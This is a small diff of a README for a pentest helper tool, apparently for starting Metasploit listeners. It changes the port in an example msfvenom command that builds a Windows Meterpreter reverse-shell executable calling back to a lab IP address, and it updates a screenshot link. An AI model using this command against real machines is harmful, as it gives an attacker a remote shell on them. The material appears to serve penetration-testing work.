@@ -8,9 +8,9 @@ Copy and paste your payload, IP and Port from the msfvenom command and execute i
 Let's say you ran this msfvenom command to generate an executable binary for a reverse shell:  
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.41 LPORT=1338 -f exe -o lazy.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.41 LPORT=1337 -f exe -o lazy.exe
 ```
-![image](https://github.com/LazyTitan33/MultiHandler/assets/80063008/0dd82f56-f509-4352-ad9f-a710e7e042b5)
+![image](https://github.com/LazyTitan33/MultiHandler/assets/80063008/cc36f386-7eac-42d7-b735-8b358e9f19cd)
 
 You would then normally need to:
 1. start Meterpreter
